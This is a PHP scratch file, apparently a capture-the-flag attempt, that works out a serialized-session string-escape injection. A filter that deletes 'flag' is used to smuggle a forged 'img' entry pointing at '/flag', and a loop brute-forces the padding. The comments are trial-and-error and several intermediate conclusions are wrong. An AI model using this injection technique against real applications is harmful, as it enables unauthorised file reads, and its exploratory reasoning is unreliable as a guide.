<?php
// Let me trace through the parsing step by step

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Filtered: a:3:{s:4:"user";s:102:"";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:102:" - value 1
//   PHP reads 102 bytes from position after opening quote
//   Position after opening quote: " (closing quote of empty string)
//   
//   Content: ";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   PHP reads 102 bytes: ";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==" (102 bytes, missing the last })
//   
//   Let me count: ";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw=="
//   
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   L = 1
//   2 = 1
//   Z = 1
//   s = 1
//   Y = 1
//   W = 1
//   c = 1
//   = = 1
//   " = 1
//   ; = 1
//   } = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   8 = 1
//   : = 1
//   " = 1
//   f = 1
//   u = 1
//   n = 1
//   c = 1
//   t = 1
//   i = 1
//   o = 1
//   n = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   1 = 1
//   0 = 1
//   : = 1
//   " = 1
//   s = 1
//   h = 1
//   o = 1
//   w = 1
//   _ = 1
//   i = 1
//   m = 1
//   a = 1
//   g = 1
//   e = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   Z = 1
//   3 = 1
//   V = 1
//   l = 1
//   c = 1
//   3 = 1
//   R = 1
//   f = 1
//   a = 1
//   W = 1
//   1 = 1
//   n = 1
//   L = 1
//   n = 1
//   B = 1
//   u = 1
//   Z = 1
//   w = 1
//   = = 1
//   = = 1
//   " = 1
//   Total: 102 bytes
//   
//   Then PHP expects "; (closing quote and semicolon)
//   Next char: ; (from the remaining ";}
//   PHP reads: ; (semicolon)
//   Expected ", got ;
//   Error!

// I see the issue! The 102nd byte is " (the closing quote of the img value),
// and the next char is ; (the semicolon after the closing quote).
// 
// PHP expects "; (closing quote and semicolon), but the next char is ; (not ")!

// We need to adjust the payload so that the 102nd byte is followed by ";!

// Let me think about this:
// 
// The content is: ";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// We want PHP to read N bytes, and then the next chars should be ";!
// 
// Let me find positions where "; appears:
// Position 0: "
// Position 1: ;
// ...
// Position 27: "
// Position 28: ;
// Position 29: }
// Position 30: "
// Position 31: ;
// ...
// Position 101: "
// Position 102: ;
// Position 103: }
// 
// So "; appears at positions 0-1, 27-28, 30-31, 101-102.
// 
// If we make N = 100, then the (N+1)th byte (position 101) is "!
// 
// PHP reads 100 bytes, then the next char is " (position 101).
// PHP reads " as the closing quote.
// Next char is ; (position 102).
// PHP reads ; as the semicolon.
// 
// PHP found "; and continues parsing!
// 
// The next chars are: } (position 103)
// PHP parses } as the end of array.
// 
// But the array count is 3, and we've only parsed 1 element (user)!

// Hmm, this doesn't work either!

// Let me think about this differently.
// 
// The key insight: we want to inject a new img key-value pair.
// 
// The injection ";s:3:"img";s:20:"L2ZsYWc=";} should be parsed as:
// - " closes the current VALUE
// - ; separates KEY and VALUE
// - s:3:"img" is the new KEY
// - ; separates KEY and VALUE
// - s:20:"L2ZsYWc=" is the new VALUE
// - "; closes the VALUE
// - } closes the array

// For this to work, PHP needs to parse the injection as separate elements!

// But the escape trick reads the injection as part of the VALUE, not as separate elements!

// I think the issue is that I'm using VALUE escape, not KEY escape!

// Let me try KEY escape:
// POST _SESSION[flag...]=inject
// 
// The key name shrinks, and PHP reads extra bytes from the separator.
// These extra bytes become part of the KEY NAME.
// 
// If we craft it correctly, the KEY NAME would be a valid key,
// and the VALUE would be our injection!

// Let me test this:

// Key name: flagflagflagflag (16 bytes, 4 'flag's)
// Value: ";s:3:"img";s:20:"L2ZsYWc=";} (29 bytes)
// 
// Serialized: s:16:"flagflagflagflag";s:29:";s:3:"img";s:20:"L2ZsYWc=";}"
// After filter: s:16:"";s:29:";s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads 16 bytes from "" (empty).
// Content after "": ";s:29:";s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads 16 bytes: ";s:29:";s:3:"im (16 bytes)
// KEY NAME = ";s:29:";s:3:"im
// 
// Then PHP expects KEY VALUE.
// Next chars: g";s:20:"L2ZsYWc=";}"
// 
// PHP reads: g (not a valid serialized type!)
// Error!

// The issue is that the KEY NAME is not a valid serialized key!

// Let me think about what a valid KEY looks like:
// s:N:"key_name";
// 
// So the KEY NAME should start with s:N:"...

// If we can make the escaped content be: s:3:"img";s:20:"L2ZsYWc=";
// Then PHP would parse:
// - s:3:"img" as the KEY
// - ; as the separator
// - s:20:"L2ZsYWc=" as the VALUE
// - ; as the separator
// - } as the end of array

// But the escaped content starts with ";s:..., not s:...!

// I think the key insight is:
// The escaped content should NOT include the initial " and ;!
// 
// We need to adjust the injection so that the escaped content starts with s:...!

// Let me try:
// Key name: flag (4 bytes)
// Value: s:3:"img";s:20:"L2ZsYWc=";} (27 bytes)
// 
// Serialized: s:4:"flag";s:27:"s:3:"img";s:20:"L2ZsYWc=";}"
// After filter: s:4:"";s:27:"s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads 4 bytes from "" (empty).
// Content after "": ";s:27:"s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads 4 bytes: ";s: (4 bytes)
// KEY NAME = ";s:
// 
// Then PHP expects KEY VALUE.
// Next chars: 27:"s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads: 27 (length indicator)
// 
// Hmm, this doesn't work because 27 is not a valid serialized type!

// Let me try with more 'flag's:
// 
// Key name: flagflagflagflag (16 bytes)
// Value: s:3:"img";s:20:"L2ZsYWc=";} (27 bytes)
// 
// Serialized: s:16:"flagflagflagflag";s:27:"s:3:"img";s:20:"L2ZsYWc=";}"
// After filter: s:16:"";s:27:"s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads 16 bytes from "" (empty).
// Content after "": ";s:27:"s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads 16 bytes: ";s:27:"s:3:"img (16 bytes)
// KEY NAME = ";s:27:"s:3:"img
// 
// Then PHP expects KEY VALUE.
// Next chars: ";s:20:"L2ZsYWc=";}"
// 
// PHP reads: " (opening quote)
// Then reads VALUE content: ;s:20:"L2ZsYWc=";}
// 
// Hmm, this doesn't work either!

// I think I need to find the exact number of 'flag's to make the parsing work.

// Let me try different values:

for ($n = 1; $n <= 20; $n++) {
    $key_name = str_repeat('flag', $n);
    $value = 's:3:"img";s:20:"L2ZsYWc=";}';
    
    $_SESSION = [];
    $_SESSION[$key_name] = $value;
    $_SESSION['function'] = 'show_image';
    $_SESSION['img'] = base64_encode('guest_img.png');
    
    $serialized = serialize($_SESSION);
    $filtered = filter($serialized);
    
    $result = @unserialize($filtered);
    
    if ($result !== false) {
        echo "n=$n: SUCCESS!\n";
        var_dump($result);
        break;
    }
}

